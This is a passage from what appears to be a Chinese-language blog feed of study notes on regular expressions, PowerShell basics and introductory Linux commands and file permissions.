：匹配非数字</li><li>. （点）：表示匹配任意单个字符<ul><li>默认情况下，无法匹配换行符，可在多行模式下设置匹配模式修饰符使之真正匹配任意字符，包括换行符</li></ul></li></ul><p>注意有些程序并不完全支持上面的反斜线转义字符。例如：gnu   grep 2.6版本不支持<code>\s</code>、<code>\d</code>,而gnu  grep  2.20支持<code>\s</code>,但不支持<code>\d</code>，sed不支持<code>\d</code></p><p>上面所说的单词（word），在正则表达式中的含义是：<code>[a-z0-9A-Z_]</code>组成的字符或字符串都是单词，例如<code>nihao</code>，<code>hello world_</code>第一个单词是<code>nihao</code>，第二个单词是<code>hello</code>，第三个单词是<code>world_</code>。</p><h5 id="5-2中括号表达式"><a href="#5-2中括号表达式" class="headerlink" title="5.2中括号表达式"></a>5.2中括号表达式</h5><h6 id="5-2-1-组"><a href="#5-2-1-组" class="headerlink" title="5.2.1 组"></a>5.2.1 组</h6><p>普通中括号包围的字符组：表示某单个字符匹配括号内任一字符即匹配成功</p><ul><li><code>x[abc]z</code>   ：可以匹配包含“xaz”  “xbz”  “xcz”的字符串</li><li>取反表示法：中括号内开头使用<code>^</code>,表示只要不是中括号中的字符就匹配<ul><li><code>x[^abc]z</code>：可以匹配包含”xdz“ ，”xez“等字符串，但不能匹配包含“xaz”  “xbz”  “xcz”的字符串</li></ul></li><li>范围表示法：<ul><li><code>[a-z]</code>：代表任一单个小写字母<ul><li><code>[^a-z]</code>：只要单个非小写字母的其他任一单个字母</li></ul></li><li><code>[A-Z]</code>：代表任一单个大写字母</li><li><code>[0-9]</code>：代表任一单个数字<ul><li>注：<strong><code>[0-59]</code>表示匹配 <code>0，1，2，3，4，5，9</code>而不是0到59的中间的数值</strong></li></ul></li><li><code>[a-z0-9A-Z]</code>：代表任意字母数字</li><li><code>[a-z0-9A-Z_]</code>：代表代表任一字母、数字、下划线，即匹配<strong>单词字符</strong>（word）</li><li><code>[A-z]</code>或<code>[a-Z]</code>：建议不要使用这种横跨大小写的范围表达式，不同地方表达的含义不同</li><li>甚至有些按照字典顺序排序时，<code>[a-d]</code>不是等价于abcd，而是等价于<code>[aBbCcDd]</code>。如果想要等价于abcd，应将locale环境设置为<code>LC_ALL=c</code></li></ul></li><li>特殊元字符在中括号中的匹配：<ul><li>想要在中括号中匹配<code>^</code>，需将其放在中括号的非开头位置，如<code>[a^]</code></li><li>想要在中括号中匹配<code>-</code>，需将其放在开头位置或结尾位置，如<code>[abc-]</code>、<code>[-abc]</code></li><li>想要在中括号中匹配<code>]</code>，需将其放在开头位置，如<code>[]abc]</code>（强制必须在第一个）</li><li>想要匹配上面两个或三个字符，[]^]、[-^]、[]-]、[]^-]</li></ul></li></ul><h6 id="5-2-2-字符类"><a href="#5-2-2-字符类" class="headerlink" title="5.2.2 字符类"></a>5.2.2 字符类</h6><p>将字符分成不同的类别，称为字符类</p><p>下面是<code>POSIX</code>标准：</p><table><thead><tr><th>字符类</th><th align="left">含义</th></tr></thead><tbody><tr><td>[:lower:]</td><td align="left">等价于<code>a-z</code></td></tr><tr><td>[:upper:]</td><td align="left">等价于<code>A-Z</code></td></tr><tr><td>[:alpha:]</td><td align="left">等价于<code>A-Za-z</code>，也等价于<code>[:lower:]</code>  +  <code>[:upper:]</code></td></tr><tr><td>[:digit:]</td><td align="left">等价于<code>0-9</code></td></tr><tr><td>[:alnum:]</td><td align="left">等价于<code>0-9A-Za-z</code>，也等价于<code>[:lower:]</code>  +  <code>[:upper:]</code>  +  <code>[:digit:]</code></td></tr><tr><td>[:xdigit:]</td><td align="left">匹配十六进制数字 0 1 2 3 4 5 6 7 8 9 a b c d e f  A  B  C  D  E  F</td></tr><tr><td>[:space:]</td><td align="left">匹配空格、制表符、换行符、换页符、垂直制表符、回车符等等所有空白符号</td></tr><tr><td>[:blank:]</td><td align="left">匹配空格</td></tr><tr><td>[:punct:]</td><td align="left">匹配所有标点符号，<code>!  “  #  $  %  &amp; (  )  *  +  -   ,   .  /  :  ;  &lt;  =  &gt;   ?  @  [  \  ]  ^  _     {   }</code></td></tr><tr><td>[:print:]</td><td align="left">可打印字符：包含<code>[:alnum:]</code>  +  <code>[:punct:]</code>  +  空格</td></tr><tr><td>[:graph:]</td><td align="left">图形字符，即能展现字符颜色的符号，等价于<code>[:alnum:]</code>  +  <code>[:punct:]</code></td></tr><tr><td>[:cntrl:]</td><td align="left">所有的控制字符，八进制的000到037，以及177（<code>DEL</code>）</td></tr></tbody></table><p>有些语言还额外提供一些非POSIX的字符类，比如<code>[:ascii:]</code>表示任一ASCII表中的字符。</p><p>使用字符时，需使用中括号包围：</p><ul><li><code>[[:alpha:]]</code> ：任一字母</li><li><code>[^[:alpha:]]</code> ：任一非字母</li><li><code>[^[:alpha:]0-3]</code>：任一非字母且非0 1 2 3</li></ul><h6 id="5-2-3-等价类和排序类"><a href="#5-2-3-等价类和排序类" class="headerlink" title="5.2.3 等价类和排序类"></a>5.2.3 等价类和排序类</h6><p><code>[=a=]</code>包围时表示等价类，等价类表示将普通字母和带有重音的字母（带音节）归为一类。</p><p><code>[.xyz.]</code>包围时表示排序类，排序类表示将<code>[..]</code>包围的多个符号当作一个字符，但要求在字符集中预先定义映射关系，例如已经预定了xyz对应于R，那么<code>a[[.xyz.]]a</code>表示可以匹配<code>aRa</code>。</p><h5 id="5-3-位置匹配（锚定）"><a href="#5-3-位置匹配（锚定）" class="headerlink" title="5.3 位置匹配（锚定）"></a>5.3 位置匹配（锚定）</h5><p>字符匹配会消耗字符。位置匹配，只是匹配位置，不会消耗字符。</p><p>只匹配位置，不匹配字符，所以不会消耗字符数量，也称为<strong>零宽断言</strong>。</p><ul><li><code>^</code>：匹配行首   <code>[^s]</code></li><li><code>$</code>：匹配行尾   <code>[n$]</code></li><li><code>\&lt;</code>：匹配单词开头处的位置   <code>\&lt;n</code></li><li><code>\&gt;</code>：匹配单词结尾处的位置   <code>n\&gt;</code></li><li><code>\b</code>：匹配单词边界处的位置（开头和结尾），所以<code>\bword\b</code>等价于<code>\&lt;word\&gt;</code></li><li><code>\B</code>：匹配非单词边界处的位置  hello中使用   <code>\Bllo</code>匹配  llo</li></ul><h4 id="6-正则表达式的匹配过程"><a href="#6-正则表达式的匹配过程" class="headerlink" title="6.正则表达式的匹配过程"></a>6.正则表达式的匹配过程</h4><p>reg：abc</p><p>str：“aabxabcxyz”</p><p>每一轮正则的匹配，都需要从正则的第一个元素从头开始匹配，</p><p>第一轮匹配：</p><ul><li>扫描第一个字符，和正则表达式的第一个元素进行匹配</li><li>如果匹配失败，则意味着这一轮的正则匹配失败</li></ul><p>第二轮匹配：</p><ul><li>扫描下一个字符，从头开始和正则表达式进行匹配</li><li>如果匹配成功，则继续扫描下一个字符和正则表达式的下一个元素进行匹配<ul><li>如果这个字符匹配失败，则导致这一轮正则匹配失败</li><li>交还除第二轮匹配开始的首字符外的所有字符</li><li>交还之后，从交还的第一个字符开始进行下一轮匹配</li></ul></li></ul><p>第三轮匹配：</p><ul><li>如果这一轮的正则匹配成功，则不交还匹配成功的字符</li><li>然后从匹配成功的下一个字符进入下一轮匹配</li></ul><p>字符消耗问题：</p><ul><li><p>某轮正则匹配成功，则消耗所有匹配成功的字符</p></li><li><p>某轮匹配失败，则消耗本轮匹配的首字符，剩余的字符被交还</p></li></ul><h5 id="6-1-量词（重复匹配次数）"><a href="#6-1-量词（重复匹配次数）" class="headerlink" title="6.1 量词（重复匹配次数）"></a>6.1 量词（重复匹配次数）</h5><p>注意：在基础正则表达式中，对于量词的元字符需要加上反斜线进行转义。</p><p>关于量词需要注意结论：<strong>量词它是正则表达式中的一个隐含的修饰符，它修饰它前一个字符或前面一个子表达式，它自身不是正则表达式中的独立元素，量词和它所修饰的字符或子表达式组合起来才是正则表达式中的独立元素</strong>。</p><p><strong>量词可能会出现大量的回溯，而回溯是正则表达式中的性能杀手</strong></p><ul><li><code>{m}</code> ：表示匹配前一个字符或前一个子表达式m次<ul><li>“<code>a{3}</code>”：匹配a 3次。aaa  成功       aa不成功   </li><li>“<code>[abc]{3}</code>” ：表示匹配aaa  bbb   ccc   abc  aba  cba </li></ul></li><li><code>{m,n}</code>：（m&lt;n）表示匹配前一个字符或前一个子表达式最少m次，最多n次<ul><li>“{3，5}”：  aaa  aaaa   aaaaa</li></ul></li><li><code>{m,}</code>：表示匹配前一个字符或前一个子表达式至少m次</li><li><code>{,n}</code>：表示匹配前一个字符或前一个子表达式最多n次（注：不一定会支持该语法）<ul><li>注意：<strong>匹配0次也算匹配成功，只不过这时候匹配的是空字符，grep没法显示出来</strong></li></ul></li><li><code>?</code>：表示匹配前一个字符或子表达式0或1次<ul><li><code>ab?c</code> ：匹配 <code>abc   ac</code></li></ul></li><li><code>*</code>：表示匹配前一个字符或子表达式0或多次，即任意次数<ul><li><code>a3*b</code>：可以匹配<code>ab 、a3b   、a33b、a333333333b</code></li><li><code>.*</code>   ：匹配任意长度的任意字符<ul><li>问：为什么  <code>.*</code>匹配的是任意字符任意长度，而不是某个字符任意长度</li><li>“<code>.*</code>”    333   333333333  abcdef </li></ul></li></ul></li><li><code>+</code>表示匹配前一个字符或子表达式1次或多次，即至少一次，等价于  <code>{1，}</code><ul><li><code>a+</code>     aa   aaaaaa  a   aaaaaaaa</li><li><code>[abc]+</code>     abcabcabc</li></ul></li></ul><p>这些量词均为贪婪匹配模式，即尽可能多的去匹配符合条件的字符，例如正则表达式ab.<em>c去匹配字符串abbcdecfc，其中.\</em>部分匹配的将是bcdecf。</p><h5 id="6-2-非贪婪匹配的实现"><a href="#6-2-非贪婪匹配的实现" class="headerlink" title="6.2 非贪婪匹配的实现"></a>6.2 非贪婪匹配的实现</h5><p>基础正则和扩展正则都只支持贪婪匹配，不支持非贪婪匹配。如果想要在基础正则或扩展正则上实现非贪婪匹配，比较复杂，但也能实现。例如：</p><pre class=" language-c"><code class="language-c"># 字符串：“abc<span class="token punctuation">:</span>def<span class="token punctuation">:</span>ghi<span class="token punctuation">:</span>jkl”# 匹配目标：取第一列，即“abc”# 正则表达式：    # 错误写法：“<span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">:</span>”    # 正确写法：“<span class="token punctuation">[</span><span class="token operator">^</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">*</span>”# 匹配目标：取前两列，即“abc<span class="token punctuation">:</span>def”# 正则表达式：“<span class="token punctuation">[</span><span class="token operator">^</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token operator">^</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">*</span>”</code></pre><p>怎么实现：以中括号取反的方式排除分隔符，然后用量词去修饰</p><h4 id="7-二选一表达式"><a href="#7-二选一表达式" class="headerlink" title="7. 二选一表达式"></a>7. 二选一表达式</h4><p>基础正则表达式中，需要对<code>|</code>进行转义，使用<code>\|</code>来表示二选一（ <code>|</code>的优先级很低）</p><p>竖线  <code>|</code>分割的左右两个正则表达式，表示匹配任一一个即可。例如：<code>a|b</code> 表示a或者b，在结果上等价于  <code>[ab]</code>；<code>[0-5]|\sa</code>表示 0、1、2、3、4、5、 <code>“  a”</code></p><p>使用二选一表达式注意几点：</p><ol><li>二选一元字符优先级很低，所以<code>abc|def</code>表示的是abc或def，等价于<code>(abc)|(def)</code>，而不是<code>ab(c|d)ef</code></li><li>二选一结果和中括号表达式的性能比较：<ul><li>对于DFA引擎（grep  egrep   awk   sed）来说，二选一结构和中括号的性能是完全一样的，比如  <code>a|b|c|d|e</code>和[abcde]完全等价</li><li>对于NFA引擎（编程语言支持的正则表达式全是nfa引擎）来说，二选一结构性能远低于中括号性能，  <code>a|b|c|d|e</code>意味着5倍的回溯数量，而`[abcde]它只有单词回溯数量<ul><li>能用中括号表达式就不要用二选一结构</li><li>把尽可能匹配到的选择写在二选一结构前面</li></ul></li></ul></li><li>二选一结构在分组捕获时只有成功匹配时才会能反向引用<ul><li><code>x(abc)|(def)y</code> ：中，要么<code>\1</code>可用，要么<code>\2</code>可用，不会同时有用</li><li><code>([ab])x|cdy\1</code>：无法匹配cdya或cdyb（坑在于那个<code>或 :|</code>）</li></ul></li></ol><h4 id="8-分组捕获"><a href="#8-分组捕获" class="headerlink" title="8. 分组捕获"></a>8. 分组捕获</h4><p>使用小括号包围一部分正则表达式  <code>(pattern)</code>，这部分正则表达式即成为一个分组整体，也即成为一个子表达式。</p><p>小括号有两个隐含的功能</p><ul><li>1.分组</li><li>2.自动捕获：保存分组的匹配结果，以后可以去引用这个捕获结果</li></ul><p>根据左括号的位置决定第几个分组</p><p>例如：<code>(abc)def</code>    、<code>([a-d]){3}</code>  、 <code>(([0-9])abc(def){2})(hgi)</code>。</p><p>分组后可以使用<code>\N</code>来反向引用对应的分组的匹配结果，N是1-9的正整数，\1表示第一个分组表达式的匹配结果，\2表示第二个分组表达式的匹配结果。</p><p>例如：</p><pre class=" language-c++"><code class="language-c++">echo "you  see  see  you" | grep -E '(.*) \1'   #"a a"  "ab ab" "13 13"echo "you  see  see  you" | grep -E '((.*)(.*)) \3 \2'   #"a b b a"  #"ab abc abc  ab" #"abcd  xyz  xyz  abcd"</code></pre><p>注意：反向引用所引用的是分组匹配后的结果，不是分组表达式。</p><p>正则表达式  <code>(abc|def) and \1xyz</code>可以匹配字符串“abc   and   abcxyz”  或  “def  and  defxyz”，但是不能匹配“abc  and  defxyz”  或“def  and  abcxyz”。</p><p>如果想要引用分组表达式而不是分组捕获的结果，需使用递归正则（表达式替换）。</p><pre class=" language-c++"><code class="language-c++">echo  "abc and defxyz" | grep -P '(abc|def) and \1xyz'echo  "abc and defxyz" | grep -P '(abc|def) and (?1)xyz'第二种的匹配结果类似于：grep -P '(abc|def) and (abc|def)xyz'abc and defxyz</code></pre><h4 id="9-匹配模式修饰符"><a href="#9-匹配模式修饰符" class="headerlink" title="9. 匹配模式修饰符"></a>9. 匹配模式修饰符</h4><p><code>i</code>修饰符：忽略大小写  ： <code>“abcABC”</code>   <code>”/ab/i“</code>：可以匹配abcABC</p><p><code>g</code>修饰符：全局匹配       (grep默认全局匹配)（sed中不是全局）</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powershell</title>
      <link href="/2020/03/26/powershell/"/>
      <url>/2020/03/26/powershell/</url>
      
        <content type="html"><![CDATA[<h4 id="1-优点："><a href="#1-优点：" class="headerlink" title="1.优点："></a>1.优点：</h4><ul><li><p>计算：可以直接计算数值的加减乘除，换算GB、MB、KB</p></li><li><p>命令的命名：（简便）直接使用“动词-名词”的形式、可直接调用系统程序</p></li><li><p>面向对象的编程：面向对象并且绑定了.net平台，兼容性好、扩展性好</p></li></ul><h4 id="2-快捷键："><a href="#2-快捷键：" class="headerlink" title="2.快捷键："></a>2.快捷键：</h4><ul><li>ALT+F7：清除命令的历史记录</li><li>PgUp、PgDn：上下翻页</li><li>Enter：执行当前命令</li><li>End：将光标移至当前命令的末尾</li><li>Esc：清空当前命令行</li><li>F2：自动补充历史命令至指定字符</li><li>F4：删除命令行至光标右边指定字符处（从光标开始向前删除）</li><li>F8：检索包含指定字符的命令行历史记录</li><li>F9：根据命令行历史记录编号选择命令。历史记录编号可以通过F7查看</li><li>Home：光标移至命令行最左端</li><li>Tab：自动补齐命令</li><li>Ctrl+C：取消正在执行的命令</li></ul><h4 id="3-管道、重定向-（与Linux一样）"><a href="#3-管道、重定向-（与Linux一样）" class="headerlink" title="3.管道、重定向 （与Linux一样）"></a>3.管道、重定向 （与Linux一样）</h4><p>|：</p><ul><li>ls  |  format-table  name.mode ：format-table 类似于拼接表</li></ul><p>&gt;：</p><ul><li>&gt;、&gt;&gt;：（重定向）重写、追加写</li></ul><h4 id="4-数学运算："><a href="#4-数学运算：" class="headerlink" title="4.数学运算："></a>4.数学运算：</h4><ul><li>+、-、*、/、（）</li><li>%：求模</li><li>计算机容量计算GB、MB、KB（结果都是以字节为单位的）</li><li>-gt：大于号（比较符）</li><li>0x_ _ _ ：16进制直接转换10进制</li></ul><h4 id="5-执行命令："><a href="#5-执行命令：" class="headerlink" title="5.执行命令："></a>5.执行命令：</h4><ul><li>加上符号：&amp;”  命令  “</li></ul><h4 id="6-命令集："><a href="#6-命令集：" class="headerlink" title="6.命令集："></a>6.命令集：</h4><ul><li>get-command：获取可以使用的所有命令。</li></ul><h4 id="7-别名："><a href="#7-别名：" class="headerlink" title="7.别名："></a>7.别名：</h4><ul><li><p>set-alias  -name  别名  -value  真实值：设置别名</p></li><li><p>del  alias  别名：删除别名（在命令行设置的别名只对当前终端有效）</p></li><li><p>get-alias：获取所有别名</p></li></ul><h4 id="8-变量："><a href="#8-变量：" class="headerlink" title="8.变量："></a>8.变量：</h4><p>$变量名=变量值：变量名如果比较复杂，可以使用{}括起来</p><p>$变量名1.$变量名2=$变量名2.$变量名1：交换两个变量的值（”.“的意思是将两个变量隔离）</p><ul><li>ls  variable   ：查看变量</li><li>ls  variable:变量名   ：查看特定变量</li><li>test-path  variable:变量名  ：测试某个变量是否存在</li><li>del variable:变量名  ：删除变量</li></ul><h4 id="9-环境变量："><a href="#9-环境变量：" class="headerlink" title="9.环境变量："></a>9.环境变量：</h4><ul><li>$env:path ：系统path变量</li><li>修改环境变量方法（临时修改）：$env:path=$env:path + “变量地址”</li><li>永久修改方法：<ul><li>在系统设置里修改</li><li>使用.net方法（仅对当前用户变量生效，不是全局）：[environment]::setenvironmentvaliable(“path（变量名）”，“路径（变量值）”，“用户”)</li></ul></li></ul><h4 id="10-脚本执行策略："><a href="#10-脚本执行策略：" class="headerlink" title="10.脚本执行策略："></a>10.脚本执行策略：</h4><ul><li>set-executionpolicy  remotesigned ：设置策略为可以运行外部脚本</li></ul><h4 id="11-调用外部脚本"><a href="#11-调用外部脚本" class="headerlink" title="11.调用外部脚本"></a>11.调用外部脚本</h4><ul><li>使用.\+文件名</li><li>在cmd调用power shell脚本：在脚本中加入powershell “&amp; ‘ 文件名路径 ’   ”（用.bat调用power shell）</li></ul><h4 id="12-操作符："><a href="#12-操作符：" class="headerlink" title="12.操作符："></a>12.操作符：</h4><ul><li>比较运算符：-gt、-lt、-eq、-ne、-contains、-notcontains</li><li>大于、小于、等于、不等于、包含、不包含</li><li>-and、-or、-xor：逻辑运算</li></ul><h4 id="13-条件判断if、switch语句："><a href="#13-条件判断if、switch语句：" class="headerlink" title="13.条件判断if、switch语句："></a>13.条件判断if、switch语句：</h4><ul><li>if($num -gt 90) {“0”} ：如果num变量大于90，打印0（执行语句用{}括起来）（用“”括起来的东西会直接打印出来）</li><li>if、elseif、else：</li><li>switch语句（脚本中）：<ul><li>switch  ($变量)</li><li>{</li><li>{$_  -gt  50} {此数字小于50}</li><li>}</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Powershell </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/2020/03/26/linux/"/>
      <url>/2020/03/26/linux/</url>
      
        <content type="html"><![CDATA[<h3 id="1-Linux简单学习"><a href="#1-Linux简单学习" class="headerlink" title="1. Linux简单学习"></a>1. Linux简单学习</h3><hr><h4 id="1-1-Linux安装与VMware使用"><a href="#1-1-Linux安装与VMware使用" class="headerlink" title="1.1 Linux安装与VMware使用"></a>1.1 Linux安装与VMware使用</h4><hr><h5 id="1-1-1-Linux的不同界面"><a href="#1-1-1-Linux的不同界面" class="headerlink" title="1.1.1 Linux的不同界面"></a>1.1.1 Linux的不同界面</h5><ul><li>Ctrl+alt+F1~F6：切换不同的界面</li><li>进入图形界面：startx（有时不加x）</li><li>使用exit 注销账户，然后切换其他用户 </li></ul><hr><h4 id="1-2-Linux的命令规范"><a href="#1-2-Linux的命令规范" class="headerlink" title="1.2 Linux的命令规范"></a>1.2 Linux的命令规范</h4><ul><li>command [-option] parameter1  parameter2 …</li><li>命令          选项   参数1          参数2</li><li>一个“-”使用简写；两个“–”使用全名</li><li>命令、选项、参数之间用空格分开（不管有多少空格都视为一个空格）</li><li>命令太长时可以用转义字符 \t、\b等来转义回车键</li><li>回车键代表命令执行</li><li>命令的大小写不同，不是同一个命令</li></ul><hr><h5 id="1-2-1-Linux基础命令操作"><a href="#1-2-1-Linux基础命令操作" class="headerlink" title="1.2.1 Linux基础命令操作"></a>1.2.1 Linux基础命令操作</h5><ul><li>ls     ：显示列表</li><li>date ：显示时间日期</li><li>cal   ：显示日历</li><li>bc   ：计算器（+加、-减、* 乘、/除、^指数、%取余）</li><li>which：查看命令所在路径</li></ul><h5 id="1-2-2-几种经常使用的快捷键"><a href="#1-2-2-几种经常使用的快捷键" class="headerlink" title="1.2.2 几种经常使用的快捷键"></a>1.2.2 几种经常使用的快捷键</h5><p>Ctrl+C：终止（中断当前程序）<br>Ctrl+D：键盘输入结束、exit退出<br>Tab（一次不行按两次）：命令补全，文件补齐，参数补齐</p><p>Ctrl+u：光标处删除到首</p><p>Ctrl+k：光标处删除到尾</p><p>Ctrl+a：光标移动到首</p><hr><h4 id="1-3-系统帮助命令"><a href="#1-3-系统帮助命令" class="headerlink" title="1.3 系统帮助命令"></a>1.3 系统帮助命令</h4><h5 id="1-3-1-help-：可用于查看命令"><a href="#1-3-1-help-：可用于查看命令" class="headerlink" title="1.3.1 --help ：可用于查看命令"></a>1.3.1 <code>--help</code> ：可用于查看命令</h5><ul><li>Usage：执行命令的语法</li><li>后面是具体参数的介绍</li></ul><h5 id="1-3-2-man：可用于查看命令和文件格式"><a href="#1-3-2-man：可用于查看命令和文件格式" class="headerlink" title="1.3.2 man：可用于查看命令和文件格式"></a>1.3.2 <code>man</code>：可用于查看命令和文件格式</h5><p> <strong>1）.man命令中第一行DATE(1~9)的含义</strong></p><table><thead><tr><th>代码</th><th>代表内容</th></tr></thead><tbody><tr><td>1</td><td><u><strong>用户在shell环境中可以操作的命令</strong></u></td></tr><tr><td>2</td><td>系统内核可调用的函数与工具</td></tr><tr><td>3</td><td>一些常用的函数（function）与函数库（library），大部分为C的函数库</td></tr><tr><td>4</td><td>设备文件的说明，通常在/dev下的文件</td></tr><tr><td>5</td><td><u><strong>配置文件或是某些文件的格式</strong></u></td></tr><tr><td>6</td><td>游戏</td></tr><tr><td>7</td><td>惯例与协议</td></tr><tr><td>8</td><td><u><strong>系统管理员可用的管理命令</strong></u></td></tr><tr><td>9</td><td>跟内核有关的文件</td></tr></tbody></table><p><strong>2）.命令的介绍（每个区域的意思）</strong></p><table><thead><tr><th>代号</th><th>内容说明</th></tr></thead><tbody><tr><td>NAME</td><td>简短的命令，数据名称的说明</td></tr><tr><td>SYNOPSIS</td><td>简短的命令语法（syntax）简介</td></tr><tr><td>DESCRIPTION</td><td>较为完整的说明</td></tr><tr><td>OPTIONS</td><td>针对SYNOPSIS部分中，有列举的所有选项的说明</td></tr><tr><td>COMMANDS</td><td>当这个程序在执行时，可以在此程序中执行的命令</td></tr><tr><td>FILES</td><td>这个程序或数据所使用或参考或链接到的某些文件</td></tr><tr><td>SEE ALSO</td><td>可以参考跟这个数据或命令有关的其他说明</td></tr><tr><td>EXAMPLES</td><td>一些可以参考的范例</td></tr></tbody></table><ul><li>CONFIGURATION：配置</li><li>ENVIRONMENT：与命令相关的环境参数说明</li><li>AUTHOR：作者</li><li>COPYRIGHT：版权</li></ul><p><strong>3）. man命令常用的快捷键</strong></p><table><thead><tr><th>按键</th><th>进行工作</th></tr></thead><tbody><tr><td>空格键</td><td>向下翻一页</td></tr><tr><td>[page down]</td><td>向下翻一页</td></tr><tr><td>[page up]</td><td>向上翻一页</td></tr><tr><td>[home]</td><td>去到第一页</td></tr><tr><td>[end]</td><td>去到最后一页</td></tr><tr><td>/string</td><td>向下查找string这个字符串</td></tr><tr><td>?string</td><td>向上查找string这个字符串</td></tr><tr><td>n,N</td><td>利用/或?来查找字符串时，可以用n来继续下一个查找，利用N来进行反向查找</td></tr><tr><td>q</td><td>结束这次man page查找</td></tr><tr><td>上下左右</td><td>一行一行翻页</td></tr></tbody></table><p><strong>4）.附man命令的使用选项：</strong></p><ul><li><p>man -f  （命令） ：等同于whatis，查找与命令相关的文件</p></li><li><p>man -k  （关键词)  ：等同于apropos，搜索存在关键词的手册概述并显示所有匹配结果</p></li><li><p>whatis：查看命令帮助信息所在的路径</p><p>5）.&lt;&gt;：必选项</p></li></ul><p><strong>5）.一些符号的使用说明：</strong></p><ul><li>&lt;&gt;：必选项</li><li>[]  ：可选项</li><li>…  ：可以使用多个参数</li><li>|   ：多选一</li><li>()   ：分组（没有实际意义）</li></ul><h5 id="1-3-3-info"><a href="#1-3-3-info" class="headerlink" title="1.3.3 info"></a>1.3.3 <code>info</code></h5><p>将文件数据拆分成一个一个的段落，每个段落用自己的页面编写，并且在各个界面中还有类似网页的超链接来调到各不同的界面中，每个独立的界面也被成为一个节点（前提：该文件必须用info的格式写）</p><p><strong>info命令常用的快捷键</strong></p><table><thead><tr><th>按键</th><th>进行工作</th></tr></thead><tbody><tr><td>空格键</td><td>向下翻一页</td></tr><tr><td>[page down]</td><td>向下翻一页</td></tr><tr><td>[page up]</td><td>向上翻一页</td></tr><tr><td>[Tab]</td><td>在节点之间移动（有节点的地方，通常以*显示）</td></tr><tr><td>[Enter]</td><td>当光标在节点上面时，按下enter可进入该节点</td></tr><tr><td>b</td><td>移动光标到该info界面当中的第一处</td></tr><tr><td>e</td><td>移动光标到该info界面的最后一个节点处</td></tr><tr><td>n</td><td>前往下一个节点处</td></tr><tr><td>p</td><td>前往上一个节点处</td></tr><tr><td>u</td><td>向上移动一层</td></tr><tr><td>s（/）</td><td>在info page中进行查找</td></tr><tr><td>h,?</td><td>显示帮助选项</td></tr><tr><td>q</td><td>退出info</td></tr></tbody></table><h5 id="注：其他有用的说明文件放在-usr-share-doc-目录下。"><a href="#注：其他有用的说明文件放在-usr-share-doc-目录下。" class="headerlink" title="注：其他有用的说明文件放在/usr/share/doc/目录下。"></a>注：其他有用的说明文件放在/usr/share/doc/目录下。</h5><h5 id="1-3-4-type-：查看命令是内部命令还是外部命令"><a href="#1-3-4-type-：查看命令是内部命令还是外部命令" class="headerlink" title="1.3.4 type ：查看命令是内部命令还是外部命令"></a>1.3.4 type ：查看命令是内部命令还是外部命令</h5><h5 id="1-3-5-help：用来查看内部命令的帮助信息"><a href="#1-3-5-help：用来查看内部命令的帮助信息" class="headerlink" title="1.3.5 help：用来查看内部命令的帮助信息"></a>1.3.5 help：用来查看内部命令的帮助信息</h5><h3 id="2-Linux的基础学习"><a href="#2-Linux的基础学习" class="headerlink" title="2. Linux的基础学习"></a>2. Linux的基础学习</h3><h4 id="2-1-文件权限与目录配置"><a href="#2-1-文件权限与目录配置" class="headerlink" title="2.1 文件权限与目录配置"></a>2.1 文件权限与目录配置</h4><h5 id="2-1-1-文件属性、文件权限"><a href="#2-1-1-文件属性、文件权限" class="headerlink" title="2.1.1 文件属性、文件权限"></a>2.1.1 文件属性、文件权限</h5><p>使用 <code>ls -al</code> 列出文件及其属性</p><ul><li>属性（依次序）：【权限】【链接】【拥有者】【用户组】【文件容量】【修改日期】【文件名】</li><li>权限一共有10位（共4组）</li><li>使用<strong>file 命令</strong>来查看这个文件的类型</li></ul><table><thead><tr><th>权限位</th><th>代表的含义</th></tr></thead><tbody><tr><td>第1位（d、-、l、b、c、s、p）</td><td>d:目录；-：普通文件；l：链接文件；b：可存储设备；c：键盘鼠标；s：套接字文件；p：命名管道（<strong>使用file 命令来查看这个文件的类型</strong>）</td></tr><tr><td>第2,3,4位</td><td>文件拥有者的权限</td></tr><tr><td>第5,6,7位</td><td>文件拥有者所在用户组的权限</td></tr><tr><td>第8,9,10位</td><td>非文件拥有者所在用户组的人的权限（陌生人的权限）</td></tr></tbody></table><h5 id="2-1-2-文件权限rwx的代表数字"><a href="#2-1-2-文件权限rwx的代表数字" class="headerlink" title="2.1.2 文件权限rwx的代表数字"></a>2.1.2 文件权限rwx的代表数字</h5><table><thead><tr><th>文件权限</th><th>代表数字</th></tr></thead><tbody><tr><td>r</td><td>4</td></tr><tr><td>w</td><td>2</td></tr><tr><td>x</td><td>1</td></tr></tbody></table><h5 id="2-1-3-文件权限的修改命令-chown、chgrp、chmod"><a href="#2-1-3-文件权限的修改命令-chown、chgrp、chmod" class="headerlink" title="2.1.3 文件权限的修改命令 chown、chgrp、chmod"></a>2.1.3 文件权限的修改命令 <code>chown、chgrp、chmod</code></h5><ul><li>chgrp    [-R] ：修改用户所属用户组<ul><li>chgrp   用户组    文件/目录   ：  修改用户组</li></ul></li><li>chown   [-R] ：修改文件拥有者<ul><li>chown  –regerence=a.txt  b.txt    复制a的权限到b上</li><li>chown  [-R]  账号名称:用户组名称  文件或目录</li><li>chown  [-R]  用户名   文件/目录    ：修改属主【递归修改】</li><li>chown  [-R]   .用户组     ：修改用户组</li><li>chown  [-R]   :用户组     ：修改用户组</li><li>chown  [-R]    用户名:用户组     ：修改用户名和用户组</li></ul></li><li>chmod   [-R] ：修改文件的权限（SUID、SGID、SBIT等）<ul><li><code>chmod [augo] [+-=] [rwx] filename</code></li><li>数字类型修改权限：chmod  [-R]  xyz  文件或目录    （xyz就是rwx属性数字的相加，例如 r+w=6 ）</li><li>符号类型修改权限：chmod  [-R]  a=rwx,u=rwx,g=rwx,o=rwx  文件名或目录  </li></ul></li></ul><table><thead><tr><th>命令</th><th>身份</th><th>修改方式</th><th>权限</th><th>文件名</th></tr></thead><tbody><tr><td><code>chmod</code></td><td>a（所有人），u（用户拥有者），g（文件组），o（其他人）</td><td>+，-，=</td><td>r，w，x</td><td>filename</td></tr></tbody></table><h5 id="2-1-4-目录与文件的权限不同"><a 